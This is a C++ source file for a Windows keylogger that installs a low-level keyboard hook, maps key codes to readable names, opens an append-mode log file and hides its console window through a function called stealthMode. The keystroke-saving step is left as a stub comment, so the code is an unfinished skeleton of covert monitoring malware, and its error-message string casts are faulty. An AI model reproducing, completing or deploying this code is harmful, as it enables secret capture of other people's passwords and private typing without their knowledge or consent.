#include <Windows.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <unordered_map>

using namespace std;

HHOOK keyboardHook;

KBDLLHOOKSTRUCT keyboardStruct;

unordered_map<int, string> keyname{
	{VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, "_"},
	{VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
	{VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"},
	{VK_LCONTROL, "[LCONTROL]"}, {VK_RCONTROL, "[RCONTROL]"},
	{VK_MENU, "[ALT]"}, {VK_LWIN, "[LWIN]"}, {VK_RWIN, "[RWIN]"},
	{VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"}, {VK_HOME, "[HOME]"},
	{VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"},
	{VK_DOWN, "[DOWN]"}, {VK_PRIOR, "[PG_UP]"}, {VK_NEXT, "[PG_DOWN]"},
	{VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."}, {VK_OEM_PLUS, "+"},
	{VK_OEM_MINUS, "-"}, {VK_ADD, "+"}, {VK_SUBTRACT, "-"}, {VK_CAPITAL, "[CAPSLOCK]"},
};

ofstream output_file;

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		keyboardStruct = *((KBDLLHOOKSTRUCT*)lParam);
		// Save key stroke
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void setHook() {
	if (!(keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		MessageBox(NULL, reinterpret_cast<LPCSTR>(L"Failed to install hook!"), reinterpret_cast<LPCSTR>(L"Error"), MB_ICONERROR);
	}
}

void releaseHook() {
	UnhookWindowsHookEx(keyboardHook);
}

void stealthMode() {
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
}

int main() {
	string output_filename = "keylogger.log";
	cout << "Logging output to " << output_filename << endl;
	output_file.open(output_filename, ios_base::app);

	stealthMode();
	setHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	releaseHook();
	return 0;
}
